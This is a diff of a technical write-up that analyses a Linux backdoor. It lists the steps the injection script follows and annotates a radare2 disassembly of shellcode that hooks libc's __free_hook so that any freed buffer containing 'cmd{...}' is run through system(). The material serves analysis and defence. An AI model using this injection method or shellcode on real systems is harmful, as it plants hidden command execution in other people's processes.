@@ -238,43 +238,45 @@ main $1
 Full details can be taken from the refactored script above. What does it basically come down to?
 1. The script is called with one parameter (PID of target process to inject backdoor shellcode into)
 2. It parses the virtual memory mapping (/proc/$pid/maps) of the target process for the loaded libc library
-3. The virtual addresses (VA) of the libc functions __free_hook, system, free and malloc_usable_size are calculated for the target process (these have to be dynamically resolved, due to ASLR etc.)
+3. The virtual addresses (VA) of the libc functions __free_hook(), system(), free() and malloc_usable_size() are calculated for the target process (these have to be dynamically resolved, due to ASLR etc.)
 4. The virtual memory map is parsed for the end of an executable region in the loaded libc (to put code into)
 5. The VA of the named functions are put into placeholders inside the shellcode
 6. The updated shellcode is written to the executable memory region (step 4, *injection*)
-7. The VA of the libc function __free_hook is patched with the VA of the injected shellcode (*hooking* __free_hook, so to say)
+7. The VA of the libc function __free_hook() is patched with the VA of the injected shellcode (*hooking* __free_hook(), so to say)
 
-This way, whenever the libc function __free_hook is called inside the target process, the shellcode is called instead.
+The functions __free_hook() and free() are used to free memory, that previously has been dynamically allocated during program runtime. This way, whenever such allocated memory is freed in the target process, the execution of the shellcode is triggered.
 But what does the shellcode do?
 
-## todo: disassemble base shellcode (without dynamic substitutions from shellscript
+## Disassembly of the (unpatched) Shellcode
+*Note: The output of radare2 has been edited with additional comments for better readability.*
+
 ```
 r2 -a x86 -b 64 -qc pd shellcode_unpatched.bin
-            0x00000000      48b841414141.  movabs rax, 0x4141414141414141 ; 'AAAAAAAA'
+            0x00000000      48b841414141.  movabs rax, 0x4141414141414141 ; VA of malloc_usable_size()
             0x0000000a      4155           push r13
-            0x0000000c      49bd43434343.  movabs r13, 0x4343434343434343 ; 'CCCCCCCC'
+            0x0000000c      49bd43434343.  movabs r13, 0x4343434343434343 ; VA of system()
             0x00000016      4154           push r12
-            0x00000018      4989fc         mov r12, rdi
+            0x00000018      4989fc         mov r12, rdi ; rdi = first function param by linux 64 bit calling convention
             0x0000001b      55             push rbp
             0x0000001c      53             push rbx
-            0x0000001d      4c89e3         mov rbx, r12
+            0x0000001d      4c89e3         mov rbx, r12 ; rbx points to first function param (which is void *ptr)
             0x00000020      52             push rdx
-            0x00000021      ffd0           call rax
+            0x00000021      ffd0           call rax ; malloc_usable_size()
             0x00000023      4889c5         mov rbp, rax
-            0x00000026      48b844444444.  movabs rax, 0x4444444444444444 ; 'DDDDDDDD'
+            0x00000026      48b844444444.  movabs rax, 0x4444444444444444 ; original VA of __free_hook()
             0x00000030      48c700000000.  mov qword [rax], 0
-        ┌─> 0x00000037      4883fd05       cmp rbp, 5
-       ┌──< 0x0000003b      7661           jbe 0x9e
+        ┌─> 0x00000037      4883fd05       cmp rbp, 5 ; return value of malloc_usable_size()
+       ┌──< 0x0000003b      7661           jbe 0x9e ; skip shellcode magic if return value <= 5
        │╎   0x0000003d      803b63         cmp byte [rbx], 0x63 ; 'c'
-      ┌───< 0x00000040      7554           jne 0x96
+      ┌───< 0x00000040      7554           jne 0x96 ; skip shellcode magic if *ptr[0] != 'c'
       ││╎   0x00000042      807b016d       cmp byte [rbx + 1], 0x6d ; 'm'
-     ┌────< 0x00000046      754e           jne 0x96
+     ┌────< 0x00000046      754e           jne 0x96 ; skip shellcode magic if *ptr[1] != 'm'
      │││╎   0x00000048      807b0264       cmp byte [rbx + 2], 0x64 ; 'd'
-    ┌─────< 0x0000004c      7548           jne 0x96
+    ┌─────< 0x0000004c      7548           jne 0x96 ; skip shellcode magic if *ptr[2] != 'd'
     ││││╎   0x0000004e      807b037b       cmp byte [rbx + 3], 0x7b ; '{
-   ┌──────< 0x00000052      7542           jne 0x96
+   ┌──────< 0x00000052      7542           jne 0x96 ; skip shellcode magic if *ptr[3] != '{'
    │││││╎   0x00000054      c60300         mov byte [rbx], 0
-   │││││╎   0x00000057      488d7b04       lea rdi, [rbx + 4]
+   │││││╎   0x00000057      488d7b04       lea rdi, [rbx + 4] ; let rdi point to *ptr[4], first char after '{'
    │││││╎   0x0000005b      488d55fc       lea rdx, [rbp - 4]
    │││││╎   0x0000005f      4889f8         mov rax, rdi
   ┌───────> 0x00000062      8a08           mov cl, byte [rax]
@@ -284,11 +286,11 @@ r2 -a x86 -b 64 -qc pd shellcode_unpatched.bin
   ╎│││││╎   0x0000006e      488d52ff       lea rdx, [rdx - 1]
   ╎│││││╎   0x00000072      8d71e0         lea esi, [rcx - 0x20]
   ╎│││││╎   0x00000075      4080fe5e       cmp sil, 0x5e               ; 94
-  ────────< 0x00000079      771b           ja 0x96
+  ────────< 0x00000079      771b           ja 0x96 ; skip shellcode magic if counter is too high
   ╎│││││╎   0x0000007b      80f97d         cmp cl, 0x7d                ; '}'
   ────────< 0x0000007e      7508           jne 0x88
-  ╎│││││╎   0x00000080      c60300         mov byte [rbx], 0
-  ╎│││││╎   0x00000083      41ffd5         call r13
+  ╎│││││╎   0x00000080      c60300         mov byte [rbx], 0 ; write null termination
+  ╎│││││╎   0x00000083      41ffd5         call r13 ; system(), param is string inside cmd{}
   ────────< 0x00000086      eb0e           jmp 0x96
   ────────> 0x00000088      4883fa01       cmp rdx, 1
   └───────< 0x0000008c      75d4           jne 0x62
@@ -297,11 +299,11 @@ r2 -a x86 -b 64 -qc pd shellcode_unpatched.bin
   ─└└└└───> 0x00000096      48ffc3         inc rbx
        │╎   0x00000099      48ffcd         dec rbp
        │└─< 0x0000009c      eb99           jmp 0x37
-       └──> 0x0000009e      48b842424242.  movabs rax, 0x4242424242424242 ; 'BBBBBBBB'
+       └──> 0x0000009e      48b842424242.  movabs rax, 0x4242424242424242 ; VA of free()
             0x000000a8      4c89e7         mov rdi, r12
-            0x000000ab      ffd0           call rax
-            0x000000ad      48b855555555.  movabs rax, 0x5555555555555555 ; 'UUUUUUUU'
-            0x000000b7      48a344444444.  movabs qword [0x4444444444444444], rax ; [0x4444444444444444:8]=-1
+            0x000000ab      ffd0           call rax ; free()
+            0x000000ad      48b855555555.  movabs rax, 0x5555555555555555 ; VA of injected shellcode
+            0x000000b7      48a344444444.  movabs qword [0x4444444444444444], rax ; Patch __free_hook() 
             0x000000c1      58             pop rax
             0x000000c2      5b             pop rbx
             0x000000c3      5d             pop rbp
